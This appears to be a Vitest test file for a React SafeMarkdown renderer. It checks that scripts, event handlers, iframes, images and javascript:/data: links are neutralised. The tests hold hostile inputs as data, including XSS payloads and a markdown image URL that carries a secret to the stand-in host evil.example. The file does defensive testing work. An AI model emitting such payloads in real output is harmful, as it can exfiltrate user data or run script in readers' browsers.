import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { SafeMarkdown } from "./SafeMarkdown";

describe("SafeMarkdown", () => {
  it("renders ordinary formatting", () => {
    const { container } = render(<SafeMarkdown>{"**qalın** və *kursiv*\n\n- bir\n- iki"}</SafeMarkdown>);
    expect(container.querySelector("strong")).toHaveTextContent("qalın");
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });

  it("never runs raw HTML: scripts, handlers and iframes do not become elements", () => {
    const { container } = render(
      <SafeMarkdown>
        {
          '<script>alert(1)</script><img src=x onerror="alert(1)"><iframe src="https://evil"></iframe><b onclick="x()">kalın</b>'
        }
      </SafeMarkdown>,
    );
    expect(container.querySelector("script, iframe, img")).toBeNull();
    expect(container.querySelector("[onclick], [onerror]")).toBeNull();
  });

  it("does not show images, because an image URL can carry data out", () => {
    const { container } = render(<SafeMarkdown>{"![x](https://evil.example/?secret=VOEN1234567890)"}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("drops javascript: and data: links, keeping the words", () => {
    render(<SafeMarkdown>{"[bas](javascript:alert(1)) və [data](data:text/html,<b>x</b>)"}</SafeMarkdown>);
    expect(screen.queryByRole("link")).not.toBeInTheDocument();
    expect(screen.getByText("bas")).toBeInTheDocument();
  });

  it("opens ordinary links safely in a new tab", () => {
    render(<SafeMarkdown>{"[e-qanun](https://e-qanun.az/framework/1)"}</SafeMarkdown>);
    const link = screen.getByRole("link", { name: "e-qanun" });
    expect(link).toHaveAttribute("href", "https://e-qanun.az/framework/1");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noopener");
    expect(link.getAttribute("rel")).toContain("noreferrer");
  });
});
